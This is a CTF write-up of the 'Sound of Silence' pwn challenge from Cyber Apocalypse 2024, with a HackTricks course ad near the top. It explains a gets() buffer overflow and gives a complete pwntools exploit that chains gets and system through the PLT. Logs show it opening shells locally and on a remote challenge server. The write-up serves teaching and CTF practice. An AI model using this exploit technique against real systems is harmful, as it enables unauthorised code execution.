---
title: "Sound of Silence - Cyber Apocalypse 2024: Hacker Royale"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "rop", "heap", "canary", "pie", "ghidra", "gets", "stack", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #38997"
  url: "https://ctftime.org/writeup/38997"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Sound of Silence"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Sound of Silence
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/38997>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/sound-of-silence/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a 64-bit binary called `sound_of_silence`:

`

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`

We also have the remote Glibc library and loader:

`

```
    $ glibc/ld-linux-x86-64.so.2 glibc/libc.so.6
    GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35.
    Copyright (C) 2022 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 11.4.0.
    libc ABIs: UNIQUE IFUNC ABSOLUTE
    For bug reporting instructions, please see:
    <https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

`

## Reverse engineering

If we open the binary in Ghidra, we will see this simple `main` function:

`

```
    void main() {
      char local_28[32];
    
      system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
      gets(local_28);
    }
```

`

There is a clear Buffer Overflow vulnerability because of the use of `gets` with a fixed-size character array `local_28[32]`. The offset is 40 (32 bytes for the buffer and 8 bytes for the saved `$rbp` register value).

## Exploit development

This challenge is actually the same as [rop-2.35](https://7rocky.github.io/en/ctf/other/seccon-ctf/rop-2.35) from SECCON CTF 2023. The problem here is that the binary is compiled with a modern version of `gcc` (Ubuntu 22.04) and Glibc, so there are no useful ROP gadgets (notice NX bit is set):

`

```
    $ ROPgadget --binary sound_of_silence
    Gadgets information
    ============================================================
    0x00000000004010c8 : adc byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401135 ; nop ; ret
    0x00000000004010cb : add bh, bh ; loopne 0x401135 ; nop ; ret
    0x000000000040109c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
    0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
    0x000000000040113a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x000000000040109e : add byte ptr [rax], al ; endbr64 ; ret
    0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
    0x000000000040113b : add byte ptr [rcx], al ; pop rbp ; ret
    0x0000000000401139 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x00000000004010ca : add dil, dil ; loopne 0x401135 ; nop ; ret
    0x0000000000401038 : add dl, dh ; jmp 0x401020
    0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x0000000000401137 : add eax, 0x2ed3 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x0000000000401017 : add esp, 8 ; ret
    0x0000000000401016 : add rsp, 8 ; ret
    0x0000000000401181 : call qword ptr [rax + 0xc3c9]
    0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
    0x0000000000401014 : call rax
    0x0000000000401153 : cli ; jmp 0x4010e0
    0x00000000004010a3 : cli ; ret
    0x000000000040118b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
    0x0000000000401150 : endbr64 ; jmp 0x4010e0
    0x00000000004010a0 : endbr64 ; ret
    0x0000000000401012 : je 0x401016 ; call rax
    0x00000000004010c5 : je 0x4010d0 ; mov edi, 0x404010 ; jmp rax
    0x0000000000401107 : je 0x401110 ; mov edi, 0x404010 ; jmp rax
    0x000000000040103a : jmp 0x401020
    0x0000000000401154 : jmp 0x4010e0
    0x000000000040100b : jmp 0x4840103f
    0x00000000004010cc : jmp rax
    0x0000000000401183 : leave ; ret
    0x00000000004010cd : loopne 0x401135 ; nop ; ret
    0x0000000000401136 : mov byte ptr [rip + 0x2ed3], 1 ; pop rbp ; ret
    0x00000000004010c7 : mov edi, 0x404010 ; jmp rax
    0x0000000000401182 : nop ; leave ; ret
    0x00000000004010cf : nop ; ret
    0x000000000040114c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010e0
    0x00000000004010c6 : or dword ptr [rdi + 0x404010], edi ; jmp rax
    0x000000000040113d : pop rbp ; ret
    0x000000000040101a : ret
    0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
    0x0000000000401138 : shr dword ptr [rsi], cl ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x000000000040118d : sub esp, 8 ; add rsp, 8 ; ret
    0x000000000040118c : sub rsp, 8 ; add rsp, 8 ; ret
    0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
    0x00000000004010c3 : test eax, eax ; je 0x4010d0 ; mov edi, 0x404010 ; jmp rax
    0x0000000000401105 : test eax, eax ; je 0x401110 ; mov edi, 0x404010 ; jmp rax
    0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
    
    Unique gadgets found: 48
```

`

As a result, we must come up with another approach. The key is that `gets` leaves the `$rdi` register with a Glibc address that is writable. As a result, we can exploit the Buffer Overflow vulnerability to call `gets` again, enter `/bin/sh` as a string and after that call `system`. This solution works because we have both functions already linked to the binary, so we can use the PLT to call them.

Here we have the exploit (some minor details are omitted because they are covered in [rop-2.35](https://7rocky.github.io/en/ctf/other/seccon-ctf/rop-2.35)):

`

```
    #!/usr/bin/env python3
    
    from pwn import context, p64, remote, sys
    
    context.binary = 'sound_of_silence'
    
    
    def get_process():
        if len(sys.argv) == 1:
            return context.binary.process()
    
        host, port = sys.argv[1], sys.argv[2]
        return remote(host, port)
    
    
    io = get_process()
    
    payload  = b'A' * 40
    payload += p64(context.binary.plt.gets)
    payload += p64(context.binary.plt.system)
    
    io.sendlineafter(b'>> ', payload)
    io.sendline(b'sh #')
    io.interactive()
```

`

And we have a shell:

`

```
    $ python3 solve.py
    [*] './sound_of_silence'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'./glibc/'
    [+] Starting local process './sound_of_silence': pid 3274765
    [*] Switching to interactive mode
    $ ls
    flag.txt  glibc  solve.py  sound_of_silence
```

`

## Flag

Let’s go remote:

`

```
    $ python3 solve.py 83.136.249.153 41758
    [*] './sound_of_silence'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'./glibc/'
    [+] Opening connection to 83.136.249.153 on port 41758: Done
    [*] Switching to interactive mode
    $ ls
    flag.txt
    glibc
    sound_of_silence
    $ cat flag.txt
    HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
```

`
